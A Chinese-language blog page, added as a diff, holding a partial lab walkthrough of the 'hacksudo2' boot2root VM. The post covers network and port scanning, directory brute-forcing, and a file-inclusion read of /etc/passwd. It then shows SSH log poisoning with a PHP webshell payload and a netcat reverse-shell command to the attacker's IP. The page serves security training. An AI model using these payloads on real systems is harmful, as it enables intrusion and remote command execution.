@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"192.168.6.128","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="hacksudo2简介​    一道boot2root的综合靶场练习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacksudo2">
+<meta property="og:url" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/index.html">
+<meta property="og:site_name" content="菜心">
+<meta property="og:description" content="hacksudo2简介​    一道boot2root的综合靶场练习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/1.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/2.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/3.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/4.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/5.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/6.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/7.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/8.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/9.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/10.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/11.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/12.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/13.png">
+<meta property="og:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/14.png">
+<meta property="article:published_time" content="2021-04-22T04:34:14.000Z">
+<meta property="article:modified_time" content="2023-06-15T16:11:05.612Z">
+<meta property="article:author" content="菜心">
+<meta property="article:tag" content="入门">
+<meta property="article:tag" content="综合靶场测试">
+<meta property="article:tag" content="hacksudo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/hacksudo2/1.png">
+
+<link rel="canonical" href="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hacksudo2 | 菜心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">菜心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://192.168.6.128/2021/04/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.gif">
+      <meta itemprop="name" content="菜心">
+      <meta itemprop="description" content="目标&&付出">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hacksudo2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-22 12:34:14" itemprop="dateCreated datePublished" datetime="2021-04-22T12:34:14+08:00">2021-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-16 00:11:05" itemprop="dateModified" datetime="2023-06-16T00:11:05+08:00">2023-06-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="hacksudo2"><a href="#hacksudo2" class="headerlink" title="hacksudo2"></a>hacksudo2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>hacksudo2</li>
+<li>windows10</li>
+</ul>
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/www/html# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.43.33   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.154  a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.43.214  08:00:27:d1:cb:db       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.950 seconds (131.28 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.43.166</code></li>
+<li><code>NMAP</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.166</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/hacksuodo1# nmap -sV -A -p 1-65535 192.168.43.166</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-21 05:33 EDT</span><br><span class="line">Nmap scan report for 192.168.43.166</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: hacksudo:2</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      42743/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      47666/udp6  mountd</span><br><span class="line">|   100005  1,2,3      53357/tcp   mountd</span><br><span class="line">|   100005  1,2,3      60044/udp   mountd</span><br><span class="line">|   100021  1,3,4      39905/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41507/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      42260/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      59542/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">2049/tcp  open  nfs_acl  3 (RPC #100227)</span><br><span class="line">35955/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">41507/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="line">53357/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">60929/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">MAC Address: 08:00:27:D1:CB:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/21%OT=80%CT=1%CU=40365%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=607FF194%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.64 ms 192.168.43.166</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.96 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./hacksudo2/1.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/var/www/html# dirb http://192.168.43.214/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Apr  5 01:47:42 2021</span><br><span class="line">URL_BASE: http://192.168.43.214/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 20458                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.43.214/ ----</span><br><span class="line">+ http://192.168.43.214/file.php (CODE:200|SIZE:238)                                                                                                                                   </span><br><span class="line">+ http://192.168.43.214/info.php (CODE:200|SIZE:79922)                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Apr  5 01:48:01 2021</span><br><span class="line">DOWNLOADED: 20458 - FOUND: 2root@kali:/home/caixin# gobuster dir -u http://192.168.43.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.166/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/21 05:35:11 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/web (Status: 301)</span><br><span class="line">/audio (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/test.html (Status: 200)</span><br><span class="line">/lib (Status: 301)</span><br><span class="line">/file.php (Status: 200)</span><br><span class="line">/game.html (Status: 200)</span><br><span class="line">/tiles (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/21 05:37:48 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
+<li>首页</li>
+</ul>
+<p><img data-src="./hacksudo2/2.png" alt></p>
+<ul>
+<li><a href="http://192.168.43.166/info.php" target="_blank" rel="noopener">http://192.168.43.166/info.php</a></li>
+</ul>
+<p>发现<code>phpinfo</code>敏感信息</p>
+<p><img data-src="./hacksudo2/3.png" alt></p>
+<h3 id="发现文件包含"><a href="#发现文件包含" class="headerlink" title="发现文件包含"></a>发现文件包含</h3><p><img data-src="./hacksudo2/4.png" alt></p>
+<p><img data-src="./hacksudo2/5.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">hacksudo:x:1000:1000:hacksudo:/home/hacksudo:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">_rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志投毒"><a href="#日志投毒" class="headerlink" title="日志投毒"></a>日志投毒</h3><p><a href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['wei']); ?&gt;'@192.168.43.166 -p 1337</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./hacksudo2/6.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">http://192.168.43.166/file.php?file=../../../../var/log/auth.log&amp;wei=nc -e /bin/bash 192.168.43.86 8833</span><br></pre></td></tr></table></figure>
+
+<p>失败，应该是没有权限</p>
